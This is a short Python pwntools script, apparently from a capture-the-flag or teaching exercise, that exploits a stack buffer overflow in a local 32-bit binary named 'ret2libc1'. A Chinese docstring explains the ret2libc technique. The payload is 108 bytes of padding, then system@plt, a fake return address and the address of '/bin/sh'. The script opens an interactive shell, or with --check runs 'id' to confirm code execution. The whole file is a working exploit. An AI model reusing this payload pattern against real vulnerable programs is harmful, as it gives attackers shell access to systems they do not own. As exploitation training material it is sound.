#!/usr/bin/env python3
"""ret2libc1：程序内已有 system@plt 和 "/bin/sh" 字符串

32 位调用约定是栈传参，因此直接 返回地址 -> system@plt -> 假返回地址 -> binsh
"""
import sys

from pwn import context, ELF, p32, process

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2libc1"
CHECK = "--check" in sys.argv
OFFSET = 108


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    system_plt = elf.plt["system"]
    binsh = elf.symbols["binsh"]

    payload = b"A" * OFFSET + p32(system_plt) + p32(0xDEADBEEF) + p32(binsh)

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(payload)

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(
        f"[ret2libc1] {'PASS' if ok else 'FAIL'}  "
        f"system@plt={system_plt:#x} binsh={binsh:#x}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())